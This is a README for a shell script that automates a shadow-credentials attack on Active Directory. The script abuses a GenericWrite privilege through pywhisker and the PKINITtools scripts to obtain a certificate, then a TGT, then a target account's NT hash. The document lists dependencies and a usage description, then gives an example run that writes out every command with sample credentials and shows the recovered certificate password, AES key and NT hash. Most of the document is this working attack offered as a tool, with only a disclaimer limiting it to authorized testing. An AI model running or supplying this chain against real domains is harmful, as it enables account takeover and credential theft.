## Dependancies
1. Requires pywhisker to be installed with pipx `pipx install git+https://github.com/ShutdownRepo/pywhisker.git`
2. Requires gettgtpkinit.py and getnthash.py from https://github.com/dirkjanm/PKINITtools/tree/master. I recommend cloning the repo and setting the tools as static variable in the script. I set mine like this.
```
# Full paths to gettgtpkinit.py and getnthash.py
GETTGT_PY="/home/kali/Transfers/PKINITtools/gettgtpkinit.py"
GETNTHASH_PY="/home/kali/Transfers/PKINITtools/getnthash.py"
```
3.Requires the necessary modules needed to run gettgtpkinit.py and getnthash.py. These are typically already satisfied in the latest release of Kali Linux. For other operating systems, please consult requirements.txt on the PKINITtools repo.

## Usage
This script combines pywhisker,  gettgtpkinit.py and getnthash.py to exploit GenericWrite Active Directory privilege set over a Domain User or Computer Object(machine account), requires ADCS to be properly configured on the domain controller.
Pywhisker is used to obtain a certificate for the targeted user, gettgtpkinit.py is used to obtain a TGT using the previously obtained certificate and finally getnthash.py is used to extract the NT hash from the TGT.

## Example
```
$ ./GenericWrite_ADCS.sh contoso.local p.thompson 'Password123!' j.kelly 10.129.86.37
[*] Starting attack for: j.kelly@contoso.local
[*] Requesting certificate with pywhisker...
    pywhisker -d "contoso.local" -u "p.thompson" -p "Password123!" --target "j.kelly" --action 'add' --dc-ip "10.129.86.37" > pywhisker_output.txt
[+] PFX file: 6IeF2D54.pfx
[+] PFX password: HWZMazba3gNZljp86FVN
[*] Requesting TGT with the certificate 6IeF2D54.pfx...
    python3 "/home/kali/Transfers/PKINITtools/gettgtpkinit.py" -dc-ip "10.129.86.37" -cert-pfx "6IeF2D54.pfx" -pfx-pass "HWZMazba3gNZljp86FVN" "contoso.local/j.kelly" ccache_j.kelly > gettgt_output.txt 2>&1
[+] AES key: aa93036d089ebfb981a756c009c4440174c2f2d16e20d86973d9a81ac5de1d7d
[*] Extracting NT hash from the ticket using the AES key...
    python3 "/home/kali/Transfers/PKINITtools/getnthash.py" "contoso.local/j.kelly" -key "aa93036d089ebfb981a756c009c4440174c2f2d16e20d86973d9a81ac5de1d7d" -dc-ip "10.129.86.37"
[*] Recovered NT Hash: 22151d74ba3de9317892cba1f9393a37
```

## Disclaimer
This script is an automation wrapper for existing tools and is intended for educational and authorized testing purposes only. **Full credit goes to the original authors of these tools**. The author of this script is not responsible for any misuse or unauthorized application of this script.
